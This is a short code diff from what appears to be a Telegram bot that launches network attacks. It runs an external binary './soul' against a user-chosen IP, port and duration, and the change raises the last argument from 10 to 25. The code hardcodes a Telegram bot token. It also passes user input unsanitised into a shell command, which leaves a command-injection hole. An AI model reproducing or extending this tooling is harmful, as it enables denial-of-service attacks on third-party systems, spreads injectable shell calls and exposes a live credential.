@@ -14,7 +14,6 @@ import asyncio
 import aiohttp
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton
  
-
 loop = asyncio.get_event_loop()
 
 TOKEN = '6515314653:AAGnBl4iqTcFWxwxvFoo2ho7R3K3fpknC_A'
@@ -60,7 +59,7 @@ async def start_asyncio_loop():
         await asyncio.sleep(REQUEST_INTERVAL)
 
 async def run_attack_command_async(target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 10")
+    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 25")
     await process.communicate()
     bot.attack_in_progress = False
 
